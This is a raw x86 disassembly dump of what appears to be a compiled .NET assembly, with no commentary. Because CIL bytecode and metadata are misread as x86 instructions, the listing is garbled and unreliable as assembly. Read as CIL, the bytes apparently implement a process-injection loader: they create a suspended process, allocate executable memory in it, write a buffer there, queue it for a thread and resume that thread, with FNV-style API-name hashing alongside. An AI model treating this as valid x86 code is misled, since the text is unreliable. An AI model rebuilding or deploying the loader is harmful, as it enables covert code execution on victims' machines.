  4025a8:	82 02 00             	addb   $0x0,(%edx)
  4025ab:	70 14                	jo     0x4025c1
  4025ad:	7e 30                	jle    0x4025df
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	0a 7e 30             	or     0x30(%esi),%bh
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 16                	or     (%esi),%dl
  4025b8:	1a 7e 30             	sbb    0x30(%esi),%bh
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	0a 72 ce             	or     -0x32(%edx),%dh
  4025c0:	02 00                	add    (%eax),%al
  4025c2:	70 12                	jo     0x4025d6
  4025c4:	0a 12                	or     (%edx),%dl
  4025c6:	0b 28                	or     (%eax),%ebp
  4025c8:	01 00                	add    %eax,(%eax)
  4025ca:	00 06                	add    %al,(%esi)
  4025cc:	26 11 0b             	adc    %ecx,%es:(%ebx)
  4025cf:	7b 18                	jnp    0x4025e9
  4025d1:	00 00                	add    %al,(%eax)
  4025d3:	04 7e                	add    $0x7e,%al
  4025d5:	30 00                	xor    %al,(%eax)
  4025d7:	00 0a                	add    %cl,(%edx)
  4025d9:	11 09                	adc    %ecx,(%ecx)
  4025db:	8e 69 20             	mov    0x20(%ecx),%gs
  4025de:	00 30                	add    %dh,(%eax)
  4025e0:	00 00                	add    %al,(%eax)
  4025e2:	1f                   	pop    %ds
  4025e3:	40                   	inc    %eax
  4025e4:	28 02                	sub    %al,(%edx)
  4025e6:	00 00                	add    %al,(%eax)
  4025e8:	06                   	push   %es
  4025e9:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  4025ec:	0b 7b 18             	or     0x18(%ebx),%edi
  4025ef:	00 00                	add    %al,(%eax)
  4025f1:	04 11                	add    $0x11,%al
  4025f3:	0c 11                	or     $0x11,%al
  4025f5:	09 11                	or     %edx,(%ecx)
  4025f7:	09 8e 69 12 0d 28    	or     %ecx,0x280d1269(%esi)
  4025fd:	03 00                	add    (%eax),%eax
  4025ff:	00 06                	add    %al,(%esi)
  402601:	26 11 0c 11          	adc    %ecx,%es:(%ecx,%edx,1)
  402605:	0b 7b 19             	or     0x19(%ebx),%edi
  402608:	00 00                	add    %al,(%eax)
  40260a:	04 7e                	add    $0x7e,%al
  40260c:	30 00                	xor    %al,(%eax)
  40260e:	00 0a                	add    %cl,(%edx)
  402610:	28 04 00             	sub    %al,(%eax,%eax,1)
  402613:	00 06                	add    %al,(%esi)
  402615:	26 11 0b             	adc    %ecx,%es:(%ebx)
  402618:	7b 19                	jnp    0x402633
  40261a:	00 00                	add    %al,(%eax)
  40261c:	04 28                	add    $0x28,%al
  40261e:	05 00 00 06 26       	add    $0x26060000,%eax
  402623:	11 0b                	adc    %ecx,(%ebx)
  402625:	7b 19                	jnp    0x402640
  402627:	00 00                	add    %al,(%eax)
  402629:	04 28                	add    $0x28,%al
  40262b:	06                   	push   %es
  40262c:	00 00                	add    %al,(%eax)
  40262e:	06                   	push   %es
  40262f:	26 11 0b             	adc    %ecx,%es:(%ebx)
  402632:	7b 18                	jnp    0x40264c
  402634:	00 00                	add    %al,(%eax)
  402636:	04 28                	add    $0x28,%al
  402638:	06                   	push   %es
  402639:	00 00                	add    %al,(%eax)
  40263b:	06                   	push   %es
  40263c:	26 16                	es push %ss
  40263e:	13 0f                	adc    (%edi),%ecx
  402640:	2b 00                	sub    (%eax),%eax
  402642:	11 0f                	adc    %ecx,(%edi)
  402644:	2a 00                	sub    (%eax),%al
  402646:	00 00                	add    %al,(%eax)
  402648:	01 34 00             	add    %esi,(%eax,%eax,1)
  40264b:	00 02                	add    %al,(%edx)
  40264d:	00 43 02             	add    %al,0x2(%ebx)
  402650:	3d 80 02 0d 00       	cmp    $0xd0280,%eax
  402655:	00 00                	add    %al,(%eax)
  402657:	00 00                	add    %al,(%eax)
  402659:	00 2b                	add    %ch,(%ebx)
  40265b:	02 95 c0 02 22 14    	add    0x142202c0(%ebp),%dl
  402661:	00 00                	add    %al,(%eax)
  402663:	01 00                	add    %eax,(%eax)
  402665:	00 e5                	add    %ah,%ch
  402667:	02 39                	add    (%ecx),%bh
  402669:	1e                   	push   %ds
  40266a:	03 22                	add    (%edx),%esp
  40266c:	14 00                	adc    $0x0,%al
  40266e:	00 01                	add    %al,(%ecx)
  402670:	00 00                	add    %al,(%eax)
  402672:	71 03                	jno    0x402677
  402674:	11 82 03 22 14 00    	adc    %eax,0x142203(%edx)
  40267a:	00 01                	add    %al,(%ecx)
  40267c:	22 02                	and    (%edx),%al
  40267e:	28 31                	sub    %dh,(%ecx)
  402680:	00 00                	add    %al,(%eax)
  402682:	0a 00                	or     (%eax),%al
  402684:	2a 00                	sub    (%eax),%al
  402686:	00 00                	add    %al,(%eax)
  402688:	13 30                	adc    (%eax),%esi
  40268a:	02 00                	add    (%eax),%al
  40268c:	2e 00 00             	add    %al,%cs:(%eax)
  40268f:	00 04 00             	add    %al,(%eax,%eax,1)
  402692:	00 11                	add    %dl,(%ecx)
  402694:	02 2c 29             	add    (%ecx,%ebp,1),%ch
  402697:	20 c5                	and    %al,%ch
  402699:	9d                   	popf
  40269a:	1c 81                	sbb    $0x81,%al
  40269c:	0a 16                	or     (%esi),%dl
  40269e:	0b 2b                	or     (%ebx),%ebp
  4026a0:	14 02                	adc    $0x2,%al
  4026a2:	07                   	pop    %es
  4026a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a4:	32 00                	xor    (%eax),%al
  4026a6:	00 0a                	add    %cl,(%edx)
  4026a8:	06                   	push   %es
  4026a9:	61                   	popa
  4026aa:	20 93 01 00 01 5a    	and    %dl,0x5a010001(%ebx)
  4026b0:	0a 07                	or     (%edi),%al
  4026b2:	17                   	pop    %ss
  4026b3:	58                   	pop    %eax
  4026b4:	0b 07                	or     (%edi),%eax
  4026b6:	02 6f 13             	add    0x13(%edi),%ch
  4026b9:	00 00                	add    %al,(%eax)
  4026bb:	0a 2f                	or     (%edi),%ch
  4026bd:	02 2b                	add    (%ebx),%ch
  4026bf:	e1 06                	loope  0x4026c7
  4026c1:	2a 00                	sub    (%eax),%al
  4026c3:	00 42 53             	add    %al,0x53(%edx)
  4026c6:	4a                   	dec    %edx
  4026c7:	42                   	inc    %edx
  4026c8:	01 00                	add    %eax,(%eax)
  4026ca:	01 00                	add    %eax,(%eax)
  4026cc:	00 00                	add    %al,(%eax)
  4026ce:	00 00                	add    %al,(%eax)
  4026d0:	0c 00                	or     $0x0,%al
  4026d2:	00 00                	add    %al,(%eax)
  4026d4:	76 34                	jbe    0x40270a
  4026d6:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4026d9:	33 30                	xor    (%eax),%esi
  4026db:	33 31                	xor    (%ecx),%esi
  4026dd:	39 00                	cmp    %eax,(%eax)
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 05 00 6c 00 00    	add    %al,0x6c00
  4026e7:	00 c0                	add    %al,%al
  4026e9:	05 00 00 23 7e       	add    $0x7e230000,%eax
  4026ee:	00 00                	add    %al,(%eax)
  4026f0:	2c 06                	sub    $0x6,%al
  4026f2:	00 00                	add    %al,(%eax)
  4026f4:	f8                   	clc
  4026f5:	07                   	pop    %es
  4026f6:	00 00                	add    %al,(%eax)
  4026f8:	23 53 74             	and    0x74(%ebx),%edx
  4026fb:	72 69                	jb     0x402766
  4026fd:	6e                   	outsb  %ds:(%esi),(%dx)
  4026fe:	67 73 00             	addr16 jae 0x402701
  402701:	00 00                	add    %al,(%eax)
  402703:	00 24 0e             	add    %ah,(%esi,%ecx,1)
  402706:	00 00                	add    %al,(%eax)
  402708:	f8                   	clc
  402709:	02 00                	add    (%eax),%al
  40270b:	00 23                	add    %ah,(%ebx)
  40270d:	55                   	push   %ebp
  40270e:	53                   	push   %ebx
  40270f:	00 1c 11             	add    %bl,(%ecx,%edx,1)
  402712:	00 00                	add    %al,(%eax)
  402714:	10 00                	adc    %al,(%eax)
  402716:	00 00                	add    %al,(%eax)
  402718:	23 47 55             	and    0x55(%edi),%eax
  40271b:	49                   	dec    %ecx
  40271c:	44                   	inc    %esp
  40271d:	00 00                	add    %al,(%eax)
  40271f:	00 2c 11             	add    %ch,(%ecx,%edx,1)
  402722:	00 00                	add    %al,(%eax)
  402724:	84 02                	test   %al,(%edx)
  402726:	00 00                	add    %al,(%eax)
  402728:	23 42 6c             	and    0x6c(%edx),%eax
  40272b:	6f                   	outsl  %ds:(%esi),(%dx)
  40272c:	62 00                	bound  %eax,(%eax)
  40272e:	00 00                	add    %al,(%eax)
  402730:	00 00                	add    %al,(%eax)
  402732:	00 00                	add    %al,(%eax)
  402734:	02 00                	add    (%eax),%al
  402736:	00 01                	add    %al,(%ecx)
  402738:	57                   	push   %edi
  402739:	1d 02 1c 09 02       	sbb    $0x2091c02,%eax
  40273e:	00 00                	add    %al,(%eax)
  402740:	00 fa                	add    %bh,%dl
  402742:	01 33                	add    %esi,(%ebx)
  402744:	00 16                	add    %dl,(%esi)
  402746:	00 00                	add    %al,(%eax)
  402748:	01 00                	add    %eax,(%eax)
  40274a:	00 00                	add    %al,(%eax)
  40274c:	27                   	daa
  40274d:	00 00                	add    %al,(%eax)
  40274f:	00 05 00 00 00 1b    	add    %al,0x1b000000
  402755:	00 00                	add    %al,(%eax)
  402757:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40275a:	00 00                	add    %al,(%eax)
  40275c:	1f                   	pop    %ds
  40275d:	00 00                	add    %al,(%eax)
  40275f:	00 32                	add    %dh,(%edx)
  402761:	00 00                	add    %al,(%eax)
  402763:	00 05 00 00 00 0f    	add    %al,0xf000000
  402769:	00 00                	add    %al,(%eax)
  40276b:	00 04 00             	add    %al,(%eax,%eax,1)
  40276e:	00 00                	add    %al,(%eax)
  402770:	01 00                	add    %eax,(%eax)
  402772:	00 00                	add    %al,(%eax)
  402774:	02 00                	add    (%eax),%al
  402776:	00 00                	add    %al,(%eax)
  402778:	06                   	push   %es
  402779:	00 00                	add    %al,(%eax)
  40277b:	00 01                	add    %al,(%ecx)
  40277d:	00 00                	add    %al,(%eax)
  40277f:	00 02                	add    %al,(%edx)
  402781:	00 00                	add    %al,(%eax)
  402783:	00 02                	add    %al,(%edx)
  402785:	00 00                	add    %al,(%eax)
  402787:	00 00                	add    %al,(%eax)
  402789:	00 c8                	add    %cl,%al
  40278b:	03 01                	add    (%ecx),%eax
  40278d:	00 00                	add    %al,(%eax)
  40278f:	00 00                	add    %al,(%eax)
  402791:	00 06                	add    %al,(%esi)
  402793:	00 36                	add    %dh,(%esi)
  402795:	03 e5                	add    %ebp,%esp
  402797:	05 06 00 a3 03       	add    $0x3a30006,%eax
  40279c:	e5 05                	in     $0x5,%eax
  40279e:	06                   	push   %es
  40279f:	00 5a 02             	add    %bl,0x2(%edx)
  4027a2:	af                   	scas   %es:(%edi),%eax
  4027a3:	05 0f 00 05 06       	add    $0x605000f,%eax
  4027a8:	00 00                	add    %al,(%eax)
  4027aa:	06                   	push   %es
  4027ab:	00 82 02 fe 04 06    	add    %al,0x604fe02(%edx)
  4027b1:	00 19                	add    %bl,(%ecx)
  4027b3:	03 fe                	add    %esi,%edi
  4027b5:	04 06                	add    $0x6,%al
  4027b7:	00 fa                	add    %bh,%dl
  4027b9:	02 fe                	add    %dh,%bh
  4027bb:	04 06                	add    $0x6,%al
  4027bd:	00 8a 03 fe 04 06    	add    %cl,0x604fe03(%edx)
  4027c3:	00 56 03             	add    %dl,0x3(%esi)
  4027c6:	fe 04 06             	incb   (%esi,%eax,1)
  4027c9:	00 6f 03             	add    %ch,0x3(%edi)
  4027cc:	fe 04 06             	incb   (%esi,%eax,1)
  4027cf:	00 99 02 fe 04 06    	add    %bl,0x604fe02(%ecx)
  4027d5:	00 6e 02             	add    %ch,0x2(%esi)
  4027d8:	c6 05 06 00 4c 02 c6 	movb   $0xc6,0x24c0006
  4027df:	05 06 00 dd 02       	add    $0x2dd0006,%eax
  4027e4:	fe 04 06             	incb   (%esi,%eax,1)
  4027e7:	00 b4 02 0f 04 06 00 	add    %dh,0x6040f(%edx,%eax,1)
  4027ee:	01 07                	add    %eax,(%edi)
  4027f0:	9d                   	popf
  4027f1:	04 06                	add    $0x6,%al
  4027f3:	00 c2                	add    %al,%dl
  4027f5:	05 99 07 06 00       	add    $0x60799,%eax
  4027fa:	bc 04 99 07 0a       	mov    $0xa079904,%esp
  4027ff:	00 1d 07 55 05 06    	add    %bl,0x6055507
  402805:	00 18                	add    %bl,(%eax)
  402807:	05 9d 04 06 00       	add    $0x6049d,%eax
  40280c:	01 02                	add    %eax,(%edx)
  40280e:	9d                   	popf
  40280f:	04 06                	add    $0x6,%al
  402811:	00 31                	add    %dh,(%ecx)
  402813:	02 e5                	add    %ch,%ah
  402815:	05 06 00 c7 01       	add    $0x1c70006,%eax
  40281a:	9d                   	popf
  40281b:	04 06                	add    $0x6,%al
  40281d:	00 33                	add    %dh,(%ebx)
  40281f:	04 9d                	add    $0x9d,%al
  402821:	04 06                	add    $0x6,%al
  402823:	00 22                	add    %ah,(%edx)
  402825:	05 9d 04 06 00       	add    $0x6049d,%eax
  40282a:	10 05 9d 04 06 00    	adc    %al,0x6049d
  402830:	c3                   	ret
  402831:	03 9d 04 06 00 42    	add    0x42000604(%ebp),%ebx
  402837:	07                   	pop    %es
  402838:	9d                   	popf
  402839:	04 06                	add    $0x6,%al
  40283b:	00 a4 04 99 07 06 00 	add    %ah,0x60799(%esp,%eax,1)
  402842:	6f                   	outsl  %ds:(%esi),(%dx)
  402843:	01 99 07 06 00 63    	add    %ebx,0x63000607(%ecx)
  402849:	01 99 07 06 00 86    	add    %ebx,-0x79fff9f9(%ecx)
  40284f:	01 9d 04 06 00 08    	add    %ebx,0x8000604(%ebp)
  402855:	00 9d 04 06 00 01    	add    %bl,0x1000604(%ebp)
  40285b:	00 86 06 06 00 c2    	add    %al,-0x3dfff9fa(%esi)
  402861:	01 b6 00 06 00 17    	add    %esi,0x17000600(%esi)
  402867:	02 9d 04 06 00 92    	add    -0x6dfff9fc(%ebp),%bl
  40286d:	01 9d 04 06 00 80    	add    %ebx,-0x7ffff9fc(%ebp)
  402873:	04 c6                	add    $0xc6,%al
  402875:	05 06 00 a8 05       	add    $0x5a80006,%eax
  40287a:	9d                   	popf
  40287b:	04 00                	add    $0x0,%al
  40287d:	00 00                	add    %al,(%eax)
  40287f:	00 26                	add    %ah,(%esi)
  402881:	00 00                	add    %al,(%eax)
  402883:	00 00                	add    %al,(%eax)
  402885:	00 01                	add    %al,(%ecx)
  402887:	00 01                	add    %al,(%ecx)
  402889:	00 01                	add    %al,(%ecx)
  40288b:	00 10                	add    %dl,(%eax)
  40288d:	00 95 04 00 00 41    	add    %dl,0x41000004(%ebp)
  402893:	00 01                	add    %al,(%ecx)
  402895:	00 01                	add    %al,(%ecx)
  402897:	00 00                	add    %al,(%eax)
  402899:	01 00                	add    %eax,(%eax)
  40289b:	00 2f                	add    %ch,(%edi)
  40289d:	00 00                	add    %al,(%eax)
  40289f:	00 41 00             	add    %al,0x0(%ecx)
  4028a2:	06                   	push   %es
  4028a3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4028a6:	0b 01                	or     (%ecx),%eax
  4028a8:	10 00                	adc    %al,(%eax)
  4028aa:	aa                   	stos   %al,%es:(%edi)
  4028ab:	00 00                	add    %al,(%eax)
  4028ad:	00 55 00             	add    %dl,0x0(%ebp)
  4028b0:	06                   	push   %es
  4028b1:	00 0d 00 0b 01 10    	add    %cl,0x10010b00
  4028b7:	00 96 00 00 00 55    	add    %dl,0x55000000(%esi)
  4028bd:	00 18                	add    %bl,(%eax)
  4028bf:	00 0d 00 51 80 62    	add    %cl,0x62805100
  4028c5:	00 41 01             	add    %al,0x1(%ecx)
  4028c8:	51                   	push   %ecx
  4028c9:	80 d2 00             	adc    $0x0,%dl
  4028cc:	41                   	inc    %ecx
  4028cd:	01 51 80             	add    %edx,-0x80(%ecx)
  4028d0:	c0 00 44             	rolb   $0x44,(%eax)
  4028d3:	01 51 80             	add    %edx,-0x80(%ecx)
  4028d6:	8a 00                	mov    (%eax),%al
  4028d8:	44                   	inc    %esp
  4028d9:	01 51 80             	add    %edx,-0x80(%ecx)
  4028dc:	73 00                	jae    0x4028de
  4028de:	44                   	inc    %esp
  4028df:	01 06                	add    %eax,(%esi)
  4028e1:	00 f6                	add    %dh,%dh
  4028e3:	00 41 01             	add    %al,0x1(%ecx)
  4028e6:	06                   	push   %es
  4028e7:	00 4f 01             	add    %cl,0x1(%edi)
  4028ea:	09 01                	or     %eax,(%ecx)
  4028ec:	06                   	push   %es
  4028ed:	00 4b 05             	add    %cl,0x5(%ebx)
  4028f0:	09 01                	or     %eax,(%ecx)
  4028f2:	06                   	push   %es
  4028f3:	00 cf                	add    %cl,%bh
  4028f5:	01 09                	add    %ecx,(%ecx)
  4028f7:	01 06                	add    %eax,(%esi)
  4028f9:	00 e7                	add    %ah,%bh
  4028fb:	00 41 01             	add    %al,0x1(%ecx)
  4028fe:	06                   	push   %es
  4028ff:	00 eb                	add    %ch,%bl
  402901:	00 41 01             	add    %al,0x1(%ecx)
  402904:	06                   	push   %es
  402905:	00 df                	add    %bl,%bh
  402907:	03 41 01             	add    0x1(%ecx),%eax
  40290a:	06                   	push   %es
  40290b:	00 e7                	add    %ah,%bh
  40290d:	03 41 01             	add    0x1(%ecx),%eax
  402910:	06                   	push   %es
  402911:	00 a7 06 41 01 06    	add    %ah,0x6014106(%edi)
  402917:	00 b5 06 41 01 06    	add    %dh,0x6014106(%ebp)
  40291d:	00 cd                	add    %cl,%ch
  40291f:	02 41 01             	add    0x1(%ecx),%al
  402922:	06                   	push   %es
  402923:	00 79 06             	add    %bh,0x6(%ecx)
  402926:	41                   	inc    %ecx
  402927:	01 06                	add    %eax,(%esi)
  402929:	00 6e 07             	add    %ch,0x7(%esi)
  40292c:	47                   	inc    %edi
  40292d:	01 06                	add    %eax,(%esi)
  40292f:	00 0e                	add    %cl,(%esi)
  402931:	00 47 01             	add    %al,0x1(%edi)
  402934:	06                   	push   %es
  402935:	00 1a                	add    %bl,(%edx)
  402937:	00 09                	add    %cl,(%ecx)
  402939:	01 06                	add    %eax,(%esi)
  40293b:	00 4a 07             	add    %cl,0x7(%edx)
  40293e:	09 01                	or     %eax,(%ecx)
  402940:	06                   	push   %es
  402941:	00 54 07 09          	add    %dl,0x9(%edi,%eax,1)
  402945:	01 06                	add    %eax,(%esi)
  402947:	00 88 05 09 01 06    	add    %cl,0x6010905(%eax)
  40294d:	00 d1                	add    %dl,%cl
  40294f:	06                   	push   %es
  402950:	09 01                	or     %eax,(%ecx)
  402952:	06                   	push   %es
  402953:	00 47 01             	add    %al,0x1(%edi)
  402956:	09 01                	or     %eax,(%ecx)
  402958:	06                   	push   %es
  402959:	00 2e                	add    %ch,(%esi)
  40295b:	01 41 01             	add    %eax,0x1(%ecx)
  40295e:	06                   	push   %es
  40295f:	00 23                	add    %ah,(%ebx)
  402961:	01 41 01             	add    %eax,0x1(%ecx)
  402964:	00 00                	add    %al,(%eax)
  402966:	00 00                	add    %al,(%eax)
  402968:	80 00 91             	addb   $0x91,(%eax)
  40296b:	20 c3                	and    %al,%bl
  40296d:	06                   	push   %es
  40296e:	4a                   	dec    %edx
  40296f:	01 01                	add    %eax,(%ecx)
  402971:	00 00                	add    %al,(%eax)
  402973:	00 00                	add    %al,(%eax)
  402975:	00 80 00 91 20 7a    	add    %al,0x7a209100(%eax)
  40297b:	07                   	pop    %es
  40297c:	5c                   	pop    %esp
  40297d:	01 0b                	add    %ecx,(%ebx)
  40297f:	00 00                	add    %al,(%eax)
  402981:	00 00                	add    %al,(%eax)
  402983:	00 80 00 91 20 b6    	add    %al,-0x49df6f00(%eax)
  402989:	07                   	pop    %es
  40298a:	65 01 10             	add    %edx,%gs:(%eax)
  40298d:	00 00                	add    %al,(%eax)
  40298f:	00 00                	add    %al,(%eax)
  402991:	00 80 00 91 20 55    	add    %al,0x55209100(%eax)
  402997:	00 70 01             	add    %dh,0x1(%eax)
  40299a:	15 00 00 00 00       	adc    $0x0,%eax
  40299f:	00 80 00 91 20 3a    	add    %al,0x3a209100(%eax)
  4029a5:	01 77 01             	add    %esi,0x1(%edi)
  4029a8:	18 00                	sbb    %al,(%eax)
  4029aa:	00 00                	add    %al,(%eax)
  4029ac:	00 00                	add    %al,(%eax)
  4029ae:	80 00 91             	addb   $0x91,(%eax)
  4029b1:	20 a4 01 7c 01 19 00 	and    %ah,0x19017c(%ecx,%eax,1)
  4029b8:	50                   	push   %eax
  4029b9:	20 00                	and    %al,(%eax)
  4029bb:	00 00                	add    %al,(%eax)
  4029bd:	00 91 00 46 05 81    	add    %dl,-0x7efaba00(%ecx)
  4029c3:	01 1a                	add    %ebx,(%edx)
  4029c5:	00 60 20             	add    %ah,0x20(%eax)
  4029c8:	00 00                	add    %al,(%eax)
  4029ca:	00 00                	add    %al,(%eax)
  4029cc:	91                   	xchg   %eax,%ecx
  4029cd:	00 58 06             	add    %bl,0x6(%eax)
  4029d0:	d5 00                	aad    $0x0
  4029d2:	1a 00                	sbb    (%eax),%al
  4029d4:	e0 20                	loopne 0x4029f6
  4029d6:	00 00                	add    %al,(%eax)
  4029d8:	00 00                	add    %al,(%eax)
  4029da:	91                   	xchg   %eax,%ecx
  4029db:	00 36                	add    %dh,(%esi)
  4029dd:	07                   	pop    %es
  4029de:	85 01                	test   %eax,(%ecx)
  4029e0:	1b 00                	sbb    (%eax),%eax
  4029e2:	b8 21 00 00 00       	mov    $0x21,%eax
  4029e7:	00 96 00 e4 04 90    	add    %dl,-0x6ffb1c00(%esi)
  4029ed:	01 1e                	add    %ebx,(%esi)
  4029ef:	00 7c 26 00          	add    %bh,0x0(%esi,%eiz,1)
  4029f3:	00 00                	add    %al,(%eax)
  4029f5:	00 86 18 92 05 06    	add    %al,0x6059218(%esi)
  4029fb:	00 1f                	add    %bl,(%edi)
  4029fd:	00 88 26 00 00 00    	add    %cl,0x26(%eax)
  402a03:	00 93 00 44 04 96    	add    %dl,-0x69fbbc00(%ebx)
  402a09:	01 1f                	add    %ebx,(%edi)
  402a0b:	00 00                	add    %al,(%eax)
  402a0d:	00 01                	add    %al,(%ecx)
  402a0f:	00 d7                	add    %dl,%bh
  402a11:	01 00                	add    %eax,(%eax)
  402a13:	00 02                	add    %al,(%edx)
  402a15:	00 e9                	add    %ch,%cl
  402a17:	01 00                	add    %eax,(%eax)
  402a19:	00 03                	add    %al,(%ebx)
  402a1b:	00 37                	add    %dh,(%edi)
  402a1d:	06                   	push   %es
  402a1e:	00 00                	add    %al,(%eax)
  402a20:	04 00                	add    $0x0,%al
  402a22:	24 06                	and    $0x6,%al
  402a24:	00 00                	add    %al,(%eax)
  402a26:	05 00 14 06 00       	add    $0x61400,%eax
  402a2b:	00 06                	add    %al,(%esi)
  402a2d:	00 69 06             	add    %ch,0x6(%ecx)
  402a30:	00 00                	add    %al,(%eax)
  402a32:	07                   	pop    %es
  402a33:	00 28                	add    %ch,(%eax)
  402a35:	07                   	pop    %es
  402a36:	00 00                	add    %al,(%eax)
  402a38:	08 00                	or     %al,(%eax)
  402a3a:	c9                   	leave
  402a3b:	07                   	pop    %es
  402a3c:	00 00                	add    %al,(%eax)
  402a3e:	09 00                	or     %eax,(%eax)
  402a40:	33 05 02 00 0a 00    	xor    0xa0002,%eax
  402a46:	e9 04 00 00 01       	jmp    0x1402a4f
  402a4b:	00 d1                	add    %dl,%cl
  402a4d:	06                   	push   %es
  402a4e:	00 00                	add    %al,(%eax)
  402a50:	02 00                	add    (%eax),%al
  402a52:	e8 06 00 00 03       	call   0x3402a5d
  402a57:	00 f5                	add    %dh,%ch
  402a59:	03 00                	add    (%eax),%eax
  402a5b:	00 04 00             	add    %al,(%eax,%eax,1)
  402a5e:	0b 02                	or     (%edx),%eax
  402a60:	00 00                	add    %al,(%eax)
  402a62:	05 00 08 07 00       	add    $0x70800,%eax
  402a67:	00 01                	add    %al,(%ecx)
  402a69:	00 d1                	add    %dl,%cl
  402a6b:	06                   	push   %es
  402a6c:	00 00                	add    %al,(%eax)
  402a6e:	02 00                	add    (%eax),%al
  402a70:	da 06                	fiaddl (%esi)
  402a72:	00 00                	add    %al,(%eax)
  402a74:	03 00                	add    (%eax),%eax
  402a76:	65 05 00 00 04 00    	gs add $0x40000,%eax
  402a7c:	ef                   	out    %eax,(%dx)
  402a7d:	03 02                	add    (%edx),%eax
  402a7f:	00 05 00 cd 04 00    	add    %al,0x4cd00
  402a85:	00 01                	add    %al,(%ecx)
  402a87:	00 4e 00             	add    %cl,0x0(%esi)
  402a8a:	00 00                	add    %al,(%eax)
  402a8c:	02 00                	add    (%eax),%al
  402a8e:	47                   	inc    %edi
  402a8f:	01 00                	add    %eax,(%eax)
  402a91:	00 03                	add    %al,(%ebx)
  402a93:	00 ef                	add    %ch,%bh
  402a95:	00 00                	add    %al,(%eax)
  402a97:	00 01                	add    %al,(%ecx)
  402a99:	00 47 01             	add    %al,0x1(%edi)
  402a9c:	00 00                	add    %al,(%eax)
  402a9e:	01 00                	add    %eax,(%eax)
  402aa0:	00 07                	add    %al,(%edi)
  402aa2:	00 00                	add    %al,(%eax)
  402aa4:	01 00                	add    %eax,(%eax)
  402aa6:	89 07                	mov    %eax,(%edi)
  402aa8:	00 00                	add    %al,(%eax)
  402aaa:	01 00                	add    %eax,(%eax)
  402aac:	81 05 00 00 02 00 95 	addl   $0x795,0x20000
  402ab3:	07 00 00 
  402ab6:	03 00                	add    (%eax),%eax
  402ab8:	6b 07 00             	imul   $0x0,(%edi),%eax
  402abb:	00 01                	add    %al,(%ecx)
  402abd:	00 81 06 00 00 01    	add    %al,0x1000006(%ecx)
  402ac3:	00 f0                	add    %dh,%al
  402ac5:	06                   	push   %es
  402ac6:	09 00                	or     %eax,(%eax)
  402ac8:	92                   	xchg   %eax,%edx
  402ac9:	05 01 00 11 00       	add    $0x110001,%eax
  402ace:	92                   	xchg   %eax,%edx
  402acf:	05 06 00 19 00       	add    $0x190006,%eax
  402ad4:	92                   	xchg   %eax,%edx
  402ad5:	05 0a 00 29 00       	add    $0x29000a,%eax
  402ada:	92                   	xchg   %eax,%edx
  402adb:	05 10 00 31 00       	add    $0x310010,%eax
  402ae0:	92                   	xchg   %eax,%edx
  402ae1:	05 10 00 39 00       	add    $0x390010,%eax
  402ae6:	92                   	xchg   %eax,%edx
  402ae7:	05 10 00 41 00       	add    $0x410010,%eax
  402aec:	92                   	xchg   %eax,%edx
  402aed:	05 10 00 49 00       	add    $0x490010,%eax
  402af2:	92                   	xchg   %eax,%edx
  402af3:	05 10 00 51 00       	add    $0x510010,%eax
  402af8:	92                   	xchg   %eax,%edx
  402af9:	05 10 00 59 00       	add    $0x590010,%eax
  402afe:	92                   	xchg   %eax,%edx
  402aff:	05 10 00 61 00       	add    $0x610010,%eax
  402b04:	92                   	xchg   %eax,%edx
  402b05:	05 15 00 69 00       	add    $0x690015,%eax
  402b0a:	92                   	xchg   %eax,%edx
  402b0b:	05 10 00 71 00       	add    $0x710010,%eax
  402b10:	92                   	xchg   %eax,%edx
  402b11:	05 10 00 79 00       	add    $0x790010,%eax
  402b16:	92                   	xchg   %eax,%edx
  402b17:	05 10 00 b1 00       	add    $0xb10010,%eax
  402b1c:	92                   	xchg   %eax,%edx
  402b1d:	05 06 00 b9 00       	add    $0xb90006,%eax
  402b22:	f7 01 1a 00 c1 00    	testl  $0xc1001a,(%ecx)
  402b28:	61                   	popa
  402b29:	04 2a                	add    $0x2a,%al
  402b2b:	00 c1                	add    %al,%cl
  402b2d:	00 3a                	add    %bh,(%edx)
  402b2f:	04 31                	add    $0x31,%al
  402b31:	00 c1                	add    %al,%cl
  402b33:	00 56 04             	add    %dl,0x4(%esi)
  402b36:	36 00 d1             	ss add %dl,%cl
  402b39:	00 92 05 10 00 c1    	add    %dl,-0x3effeffb(%edx)
  402b3f:	00 3a                	add    %bh,(%edx)
  402b41:	04 3a                	add    $0x3a,%al
  402b43:	00 e1                	add    %ah,%cl
  402b45:	00 c1                	add    %al,%cl
  402b47:	03 40 00             	add    0x0(%eax),%eax
  402b4a:	89 00                	mov    %eax,(%eax)
  402b4c:	2a 02                	sub    (%edx),%al
  402b4e:	51                   	push   %ecx
  402b4f:	00 e9                	add    %ch,%cl
  402b51:	00 8d 07 56 00 e9    	add    %cl,-0x16ffa9f9(%ebp)
  402b57:	00 cb                	add    %cl,%bl
  402b59:	00 56 00             	add    %dl,0x0(%esi)
  402b5c:	e9 00 5a 01 5c       	jmp    0x5c418561
  402b61:	00 e9                	add    %ch,%cl
  402b63:	00 03                	add    %al,(%ebx)
  402b65:	04 62                	add    $0x62,%al
  402b67:	00 e9                	add    %ch,%cl
  402b69:	00 98 05 68 00 91    	add    %bl,-0x6eff97fb(%eax)
  402b6f:	00 6c 04 6d          	add    %ch,0x6d(%esp,%eax,1)
  402b73:	00 01                	add    %al,(%ecx)
  402b75:	01 1c 02             	add    %ebx,(%edx,%eax,1)
  402b78:	06                   	push   %es
  402b79:	00 c1                	add    %al,%cl
  402b7b:	00 dc                	add    %bl,%ah
  402b7d:	07                   	pop    %es
  402b7e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402b7f:	00 09                	add    %cl,(%ecx)
  402b81:	01 24 02             	add    %esp,(%edx,%eax,1)
  402b84:	ab                   	stos   %eax,%es:(%edi)
  402b85:	00 c1                	add    %al,%cl
  402b87:	00 f2                	add    %dh,%dl
  402b89:	06                   	push   %es
  402b8a:	b0 00                	mov    $0x0,%al
  402b8c:	c1 00 e8             	roll   $0xe8,(%eax)
  402b8f:	07                   	pop    %es
  402b90:	b6 00                	mov    $0x0,%dh
  402b92:	99                   	cltd
  402b93:	00 92 05 06 00 99    	add    %dl,-0x66fff9fb(%edx)
